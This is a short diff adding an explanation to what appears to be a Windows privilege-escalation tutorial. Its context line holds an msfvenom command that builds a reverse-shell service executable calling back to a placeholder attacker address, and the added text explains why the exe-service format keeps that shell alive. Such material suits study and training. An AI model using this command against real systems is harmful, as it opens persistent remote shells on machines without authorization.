@@ -53,6 +53,10 @@ msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-servic
 
 <b>You notice the format is exe-service so that we don't immediately lose our shell on service start.</b>
 
+A note about why this matters:
+
+When Windows makes a call to start a service, it calls the ServiceMain function and expects a return from this call. If you don't specify exe-service, the generated payload won't be able to give you a persistent shell.
+
 Then we transfer over the service file using our download logic again:
 
 ````
